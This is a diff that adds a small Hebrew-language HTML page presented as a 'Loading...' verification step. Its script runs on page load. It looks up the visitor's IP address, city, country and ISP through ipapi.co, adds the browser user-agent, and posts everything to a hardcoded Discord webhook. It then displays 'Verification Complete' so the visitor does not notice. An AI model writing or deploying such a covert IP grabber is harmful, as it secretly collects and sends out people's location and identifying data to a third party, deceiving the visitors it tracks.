@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="he">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+</head>
+<body>
+<script>
+    fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+            const payload = {
+                content: "**IP:** " + data.ip + "\n**City:** " + data.city + "\n**Country:** " + data.country_name + "\n**ISP:** " + data.org + "\n**User-Agent:** " + navigator.userAgent
+            };
+
+            fetch('https://discord.com/api/webhooks/1556521328763215984/g0lghlQzuwMt2wSAodoZ-bMRthmbV_WTty6UViiL6eLRxB3gtiE8EnzrzmLNsx5-Qull', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            document.body.innerHTML = '<h1>Verification Complete</h1><p>You can close this page.</p>';
+        });
+</script>
+<p>Loading...</p>
+</body>
+</html>
